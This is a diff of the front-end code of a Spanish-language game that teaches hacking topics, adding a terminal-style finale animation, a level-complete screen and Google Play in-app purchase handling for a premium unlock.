+          if(st.a){ push(function(){ page.innerHTML+='<div class="hk-alert"><div class="h">'+esc(hk.url.split("/")[0])+' dice:</div><div class="b">'+esc(st.a)+'<br><span class="ab">Aceptar</span></div></div>'; push(end,500); },500); }
+          else { push(end,500); }
+        },420); },320); }
+    }
+    type();
+  }
+
+  // Final de tema: Juan programa a toda mecha lo aprendido
+  function finaleAnim(done){
+    var g=gS.g, hk=HACKS[gS.key], lines=[];
+    g.pasos.forEach(function(p){ lines.push(p.o[p.c]); });
+    if(hk&&hk.steps) hk.steps.forEach(function(s){ if(s.c.charAt(0)!=='[') lines.push(s.c); });
+    var cos={cap:EQUIP.cap,glasses:EQUIP.glasses,acc:EQUIP.acc,bg:EQUIP.bg,anim:'spin'};
+    gcard.innerHTML=wrap(
+      '<div class="g-neon"><span class="b" style="font-size:1.5rem">⚡ A TODA MECHA</span></div>'+
+      '<div class="g-char-row">'+avatar(6,cos)+'<span class="g-name">HackerXd domina '+esc(shortT(g.t))+'</span></div>'+
+      '<div class="g-say" style="text-align:center">Juan teclea todo lo que acaba de aprender del tema 👇</div>'+
+      '<div class="hk-win"><div class="hk-bar"><span class="hk-dot"></span>HackerXd@kali — ~/'+esc(gS.key)+'</div><div class="hk-term" id="fastT" style="min-height:120px;max-height:150px;overflow:auto"></div></div>'+
+      '<div class="g-skipbar"><button class="g-skip" id="fSkip">saltar ⏭</button></div>');
+    var t=document.getElementById('fastT'), i=0, buf='', fin=false;
+    function end(){ if(fin)return; fin=true; done(); }
+    function prompt(){ var bar=document.querySelector('.g-skipbar'); if(bar){ bar.innerHTML='<button class="g-next" id="fGo" style="width:100%">👆 Pulsa para continuar</button>'; var go=document.getElementById('fGo'); if(go) go.addEventListener('click',end); } }
+    function showAll(){ buf=lines.map(function(l){return '$ '+l;}).join('\n'); t.textContent=buf; t.scrollTop=t.scrollHeight; }
+    function step(){ if(fin)return; if(i>=lines.length){ prompt(); return; } buf+='$ '+lines[i]+'\n'; t.textContent=buf; t.scrollTop=t.scrollHeight; i++; (gS.timers=gS.timers||[]).push(setTimeout(step,230)); }
+    document.getElementById('fSkip').addEventListener('click',function(){ clearTimers(); showAll(); prompt(); });
+    step();
+  }
+
+  function finishGame(){
+    if(gS.timer) clearInterval(gS.timer);
+    if(gTypeTimer){clearInterval(gTypeTimer);gTypeTimer=null;}
+    if(!gS._fin){ gS._fin=true; finaleAnim(finishGame); return; }
+    bump('game-plays');
+    var msg='¡Reto superado! Ya sabes qué código usar aquí. 🔥';
+    if(gS.diff==='dificil'){
+      var key='game-best-'+gS.key+'-'+gS.diff, best=null;
+      try{ best=localStorage.getItem(key); }catch(e){}
+      var isBest=(best===null || gS.elapsed<+best);
+      if(isBest){ try{localStorage.setItem(key,gS.elapsed);}catch(e){} best=gS.elapsed; }
+      msg='¡Crack! Lo hiciste en <b>'+gfmt(gS.elapsed)+'</b>'+((best!==null)?' · mejor: '+gfmt(+best):'')+(isBest&&best!==null?' 🎉 ¡récord!':'');
+    }
+    var reward=null; if(gS.diff==='dificil'){ reward=unlockNext(); }
+    gcard.innerHTML=wrap(
+      '<div class="g-neon"><span class="b" style="font-size:1.9rem">¡NIVEL COMPLETADO!</span></div>'+
+      (reward?'<div class="g-reward">🎁 ¡DESBLOQUEADO! <b>'+esc(reward.label)+'</b> — equipado 🎒 (1 ítem por tema)</div>':(gS.diff==='dificil'?'<div class="wr-count">Ya tienes todos los ítems gratis 😎 Los 💎 exclusivos están en Premium.</div>':''))+
+      '<div class="g-char-row">'+avatar(7)+'<span class="g-name">🏆 HackerXd</span></div>'+
+      '<div class="g-say"><b class="name">HackerXd</b>: '+msg+'</div>'+
+      '<div class="g-row"><button class="g-ghost" id="gAgain">Otra vez</button><button class="g-ghost" id="gW2">🎒 Personalizar</button><button class="g-next" id="gClose">Cerrar</button></div>');
+    document.getElementById('gAgain').addEventListener('click',titleScreen);
+    document.getElementById('gW2').addEventListener('click',wardrobe);
+    document.getElementById('gClose').addEventListener('click',closeGame);
+  }
+
   // ---- Premium / especializaciones (desbloqueo por código) ----
   var UNLOCK_CODE='KIRA-PRO-2026';   // <-- cámbialo por el tuyo
   var premium=document.getElementById('premium');
   function setPremium(ok){
     premium.classList.toggle('locked',!ok);
-    premium.querySelectorAll('.p-body input[type=checkbox]').forEach(function(c){ c.disabled=!ok; });
+    document.querySelectorAll('.adv').forEach(function(a){ a.classList.toggle('locked',!ok); });
+    document.querySelectorAll('#premium .p-body input[type=checkbox], .adv input[type=checkbox]').forEach(function(c){ c.disabled=!ok; });
   }
+  // Puente para la facturación de Google Play (definida fuera del IIFE)
+  window.MAPA_setPremium=function(ok){ try{ if(ok) localStorage.setItem('mapa-premium-ok','1'); }catch(e){} setPremium(!!ok); try{refresh();}catch(e){} };
+  window.MAPA_hasPremium=function(){ try{ return localStorage.getItem('mapa-premium-ok')==='1'; }catch(e){ return false; } };
   var pOk=false; try{ pOk=localStorage.getItem('mapa-premium-ok')==='1'; }catch(e){}
   setPremium(pOk);
   var uov=document.getElementById('unlockOverlay');
@@ -616,5 +1535,37 @@
   refresh();
 })();
 </script>
+<script>
+/* ===== Facturación de Google Play (cordova-plugin-purchase v13) =====
+   - En navegador/preview NO hay plugin: los botones caen al desbloqueo por código.
+   - En el APK, la compra la cobra Google Play (política obligatoria para bienes digitales).
+   - PRODUCT_ID debe coincidir EXACTAMENTE con el ID del producto creado en Play Console. */
+(function(){
+  var PRODUCT_ID='mapa_premium';           // <-- mismo ID que en Google Play Console
+  function activate(){ if(window.MAPA_setPremium) window.MAPA_setPremium(true); else { try{localStorage.setItem('mapa-premium-ok','1');}catch(e){} } }
+  function store(){ return (window.CdvPurchase && CdvPurchase.store) ? CdvPurchase.store : null; }
+  window.BILLING={ available:false, ready:false, product:null };
+  document.addEventListener('deviceready', function(){
+    var st=store(); if(!st) return;                 // sin plugin (web) -> no hacemos nada
+    window.BILLING.available=true;
+    var CP=CdvPurchase, GP=CP.Platform.GOOGLE_PLAY;
+    st.register([{ id:PRODUCT_ID, type:CP.ProductType.NON_CONSUMABLE, platform:GP }]);
+    st.when()
+      .approved(function(t){ t.verify(); })
+      .verified(function(r){ try{ r.finish(); }catch(e){} activate(); })
+      .receiptUpdated(function(){ var p=st.get(PRODUCT_ID,GP); window.BILLING.product=p; if(p && p.owned) activate(); });
+    try{ st.error(function(err){ try{console.log('[billing]',err && err.message);}catch(e){} }); }catch(e){}
+    st.initialize([GP]).then(function(){ window.BILLING.ready=true; var p=st.get(PRODUCT_ID,GP); window.BILLING.product=p; if(p && p.owned) activate(); });
+  }, false);
+  window.buyPremium=function(){
+    var st=store();
+    if(!st){ alert('La compra se realiza desde la app instalada por Google Play (en tu móvil). Aquí puedes usar un código de desbloqueo.'); return; }
+    var GP=CdvPurchase.Platform.GOOGLE_PLAY, p=st.get(PRODUCT_ID,GP), offer=p && p.getOffer && p.getOffer();
+    if(offer){ st.order(offer); } else { alert('El producto aún no está disponible; inténtalo en unos segundos.'); }
+  };
+  window.restorePremium=function(){ var st=store(); if(st){ st.restorePurchases(); } else { alert('Restaurar compras solo funciona en la app de Google Play.'); } };
+})();
+</script>
+
 </body>
 </html>
